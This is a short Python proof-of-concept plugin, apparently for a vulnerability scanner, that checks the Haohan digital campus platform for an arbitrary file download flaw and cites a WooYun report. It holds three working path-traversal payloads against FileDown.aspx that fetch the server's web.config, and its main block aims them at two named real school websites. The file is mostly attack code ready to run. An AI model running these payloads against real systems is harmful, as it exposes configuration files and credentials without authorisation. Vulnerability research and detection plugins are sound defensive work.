#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : 皓翰数字化校园平台通用型3处任意文件下载
Author    :  a
mail      :  a@lcx.cc
 
refer     :  wooyun-2015-0103034
 
"""
def assign(service, arg):
     if service == "haohan":
        return True, arg


def audit(arg):
    payloads=['IneduPortal/Components/news/FileDown.aspx?OldName=web.config&NewName=../web.config',
              'Inedu3In1/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config',
              'IneduBlog/Components/news/FileDown.aspx?OldName=web.config&NewName=../../../web.config']
    for payload in payloads:
        target = arg + payload
        code, head, res, errcode, _ = curl.curl2(target)
        
        if  code==200 and '</configuration>' in res:
            security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('haohan','http://www.shidaiedu.cn/')[1])
    audit(assign('haohan','http://www.kaiyuanzhongxue.com/')[1])